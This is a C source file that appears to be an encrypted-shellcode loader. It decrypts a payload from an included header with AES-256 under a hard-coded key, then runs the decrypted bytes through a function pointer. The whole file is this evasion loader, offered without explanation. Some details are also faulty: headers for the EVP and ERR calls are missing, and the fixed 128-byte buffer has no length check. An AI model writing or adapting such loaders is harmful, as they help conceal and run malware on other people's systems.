#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <unistd.h>

void handleErrors(void) {
    ERR_print_errors_fp(stderr);
    abort();
}

void decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key,
             unsigned char *iv, unsigned char *plaintext) {
    EVP_CIPHER_CTX *ctx;

    int len;

    int plaintext_len;

    if (!(ctx = EVP_CIPHER_CTX_new())) handleErrors();

    if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    if (1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len))
        handleErrors();
    plaintext_len = len;

    if (1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len)) handleErrors();
    plaintext_len += len;

    EVP_CIPHER_CTX_free(ctx);
}

int main() {
    unsigned char *key = (unsigned char *)"01234567890123456789012345678901"; // 256-bit key
    unsigned char *iv = (unsigned char *)"0123456789012345"; // 128-bit IV

    // Include the encoded payload
    #include "encoded_payload.h"

    int ciphertext_len = sizeof(buf) - 1;
    unsigned char decryptedtext[128];

    decrypt(buf, ciphertext_len, key, iv, decryptedtext);

    // Create a function pointer to the decrypted shellcode
    void (*func)();
    func = (void (*)()) decryptedtext;

    // Execute the shellcode
    func();

    return 0;
}
